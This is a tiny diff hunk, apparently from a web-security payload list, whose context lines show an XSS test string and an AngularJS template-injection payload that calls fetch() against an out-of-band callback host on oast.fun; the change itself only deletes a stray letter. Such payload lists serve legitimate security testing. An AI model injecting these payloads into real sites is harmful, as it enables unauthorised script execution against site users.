@@ -49,7 +49,7 @@ javascript:alert(1)
 {{constructor.constructor('fetch("https://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun")')()}}
 ```
 
-a
+
 
 
 
